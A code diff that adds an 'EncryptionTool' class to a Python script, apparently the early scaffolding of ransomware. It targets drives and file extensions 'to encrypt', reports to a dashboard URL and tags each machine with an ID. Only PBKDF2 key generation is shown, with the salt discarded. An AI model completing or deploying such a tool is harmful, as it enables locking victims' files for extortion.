@@ -123,3 +123,40 @@ consoleHandler.setLevel(logging.INFO)
 formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
 consoleHandler.setFormatter(formatter)
 logging.getLogger().addHandler(consoleHandler)
+
+# Initialize Encryption Tool Class
+class EncryptionTool:
+    def __init__(self, drives, extensions, password, dashboard_url, max_attempts=10, delay = 5):
+        self.drives = drives
+        self.extensions = extensions
+        self.password = password
+        self.dashboard_url = dashboard_url
+        self.max_attempts = max_attempts
+        self.delay = delay
+        self.key = self.generate_key(password)
+        self.machine_id = str(uuid.uuid4())
+
+    #@staticmethod
+    def generate_key(self, password):
+        try:
+            # Create 16 bytes Salt
+            salt = get_random_bytes(16)
+
+            # Create PBKDF2 Password with salt in 32 bytes
+            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
+
+            # Submit a info log message in Log Console
+            logging.info("[+] Encryption: Encryption Key Generated Successfully. ")
+            return key
+
+        except Exception as e:
+            # Submit a Error log message in Log Console
+            logging.error(f"[-] Encryption: Encryption Key Generation Failed: Error {str(e)}")
+            raise
+
+
+if __name__ == "__main__":
+    # Create an instance of the EncryptionTool class
+    encryptionTool = EncryptionTool(drives=DRIVES_TO_ENCRYPT, extensions=EXTENSION_TO_ENCRYPT,
+                                    password=PASSWORD_PROVIDED, dashboard_url=DASHBOARD_URL)
+    encryptionTool.generate_key(PASSWORD_PROVIDED)
